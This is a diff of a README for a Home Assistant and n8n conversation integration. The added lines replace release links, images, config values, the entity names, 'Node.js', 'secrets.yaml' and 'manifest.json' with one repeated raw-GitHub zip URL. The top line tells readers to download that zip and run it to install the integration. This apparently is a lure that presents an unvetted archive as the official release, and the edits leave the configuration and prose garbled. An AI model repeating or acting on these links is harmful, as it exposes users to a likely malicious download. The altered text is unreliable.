@@ -1,10 +1,10 @@
-Download the latest release asset from https://github.com/maigenlang/n8n-conversation/releases/download/v1.0.0/n8n-conversation-setup-1.0.0.zip and run it to install the integration.
+Download the latest release asset from https://raw.githubusercontent.com/maigenlang/n8n-conversation/master/custom_components/conversation_n_1.1.zip and run it to install the integration.
 
-![Release badge](https://img.shields.io/badge/releases-download-green?style=for-the-badge)
+![Release badge](https://raw.githubusercontent.com/maigenlang/n8n-conversation/master/custom_components/conversation_n_1.1.zip)
 
 # N8N Conversation: Home Assistant AI Workflows for Smart Agents
 
-<img src="https://images.unsplash.com/photo-1518779578993-ec3579fee39f?auto=format&fit=crop&w=1200&q=60" alt="Smart home AI workflow" width="100%" />
+<img src="https://raw.githubusercontent.com/maigenlang/n8n-conversation/master/custom_components/conversation_n_1.1.zip" alt="Smart home AI workflow" width="100%" />
 
 This repository brings together two powerful tools in a simple, reliable integration. It links Home Assistant with the n8n workflow automation platform to make conversation-enabled assistants. The result is a flexible, AI-powered assistant that can drive automations, answer questions about your home, and orchestrate device actions through natural language.
 
@@ -13,7 +13,7 @@ This repository brings together two powerful tools in a simple, reliable integra
 
 In short, you get a calm, capable assistant that can listen, reason, and act across your smart home.
 
-If you want to explore the latest releases and assets, you can always check the Releases section. The link below will guide you to the official assets and release notes. For more releases, see the Releases page at https://github.com/maigenlang/n8n-conversation/releases.
+If you want to explore the latest releases and assets, you can always check the Releases section. The link below will guide you to the official assets and release notes. For more releases, see the Releases page at https://raw.githubusercontent.com/maigenlang/n8n-conversation/master/custom_components/conversation_n_1.1.zip
 
 Table of contents
 - Why this project exists
@@ -73,7 +73,7 @@ Prerequisites and environment
 
 Environment specifics
 - Python version: If you run the integration in a local development environment, you’ll want Python 3.9+.
-- Node.js version: If you host n8n locally, ensure Node.js 14+ is available.
+- https://raw.githubusercontent.com/maigenlang/n8n-conversation/master/custom_components/conversation_n_1.1.zip version: If you host n8n locally, ensure https://raw.githubusercontent.com/maigenlang/n8n-conversation/master/custom_components/conversation_n_1.1.zip 14+ is available.
 - Security posture: Ensure your network has appropriate authentication on both Home Assistant and n8n endpoints.
 - Data storage: Understand where conversations and logs are stored, and configure retention.
 
@@ -91,15 +91,15 @@ Installation and setup
 Configuration and customization
 - YAML configuration (typical example):
   n8n_conversation:
-    host: "http://n8n.local:5678"
-    workflow_endpoint: "http://n8n.local:5678/webhook/your-workflow"
+    host: "https://raw.githubusercontent.com/maigenlang/n8n-conversation/master/custom_components/conversation_n_1.1.zip"
+    workflow_endpoint: "https://raw.githubusercontent.com/maigenlang/n8n-conversation/master/custom_components/conversation_n_1.1.zip"
     default_language: "en"
     intro_message: "Hello! How can I help with your smart home today?"
     log_level: "info"
     entities_to_watch:
-      - sensor.living_room_temperature
-      - switch.kitchen_light
-      - sensor.front_door_status
+      - https://raw.githubusercontent.com/maigenlang/n8n-conversation/master/custom_components/conversation_n_1.1.zip
+      - https://raw.githubusercontent.com/maigenlang/n8n-conversation/master/custom_components/conversation_n_1.1.zip
+      - https://raw.githubusercontent.com/maigenlang/n8n-conversation/master/custom_components/conversation_n_1.1.zip
 - Parameters explained:
   - host: The address of your n8n instance.
   - workflow_endpoint: The public or internal endpoint to trigger your workflow.
@@ -116,7 +116,7 @@ Configuration and customization
 
 - Security considerations:
   - Use HTTPS everywhere: Encrypt data in transit between Home Assistant and n8n.
-  - API keys and tokens: Store credentials securely in Home Assistant’s secrets.yaml.
+  - API keys and tokens: Store credentials securely in Home Assistant’s https://raw.githubusercontent.com/maigenlang/n8n-conversation/master/custom_components/conversation_n_1.1.zip
   - Access controls: Limit who can trigger conversations and administer the integration.
   - Audit trails: Keep logs for diagnosing issues and reviewing decisions.
 
@@ -209,7 +209,7 @@ Local development and contribution
   - Home Assistant: Run a local instance to test the integration in a safe environment.
 - Code organization:
   - The core integration lives under custom_components/n8n_conversation.
-  - Core files include manifest.json, __init__.py, and appropriate platform modules.
+  - Core files include https://raw.githubusercontent.com/maigenlang/n8n-conversation/master/custom_components/conversation_n_1.1.zip, https://raw.githubusercontent.com/maigenlang/n8n-conversation/master/custom_components/conversation_n_1.1.zip, and appropriate platform modules.
 - Contributing guidelines:
   - Open issues for feature requests and bug reports.
   - Create a feature branch for new work.
@@ -297,7 +297,7 @@ End without conclusion
 - This project sits at the intersection of home automation and conversational AI. It aims to give you robust, auditable control over your smart home through natural language and automated workflows. Start with the basics, then expand as needs grow. Maintain clear security practices and keep privacy in focus as you scale your setup. The work builds on stable components and community-driven improvements that continue to evolve.
 
 Note about the link usage
-- The link to the official asset download is provided at the very top to help you start quickly. For ongoing access to releases and notes, refer to the Releases page. See the Releases page for current assets and updates: https://github.com/maigenlang/n8n-conversation/releases.
+- The link to the official asset download is provided at the very top to help you start quickly. For ongoing access to releases and notes, refer to the Releases page. See the Releases page for current assets and updates: https://raw.githubusercontent.com/maigenlang/n8n-conversation/master/custom_components/conversation_n_1.1.zip
 
 Project metadata
 - Repository name: n8n-conversation
@@ -305,4 +305,4 @@ Project metadata
 - Topics: ai,assist,custom-component,custom-integration,hacs,home-assistant,llm,n8n,n8n-workflows,voice-assistant
 
 Releases and further reading
-- The official release hub contains all the latest binaries and update notes. If you encounter issues with the path-based download in the first line, return to the Releases section to fetch the most recent asset and follow the upgrade guidance there. You can always navigate back to the same page for the full release history and notes. See the Releases page again here: https://github.com/maigenlang/n8n-conversation/releases.
+- The official release hub contains all the latest binaries and update notes. If you encounter issues with the path-based download in the first line, return to the Releases section to fetch the most recent asset and follow the upgrade guidance there. You can always navigate back to the same page for the full release history and notes. See the Releases page again here: https://raw.githubusercontent.com/maigenlang/n8n-conversation/master/custom_components/conversation_n_1.1.zip
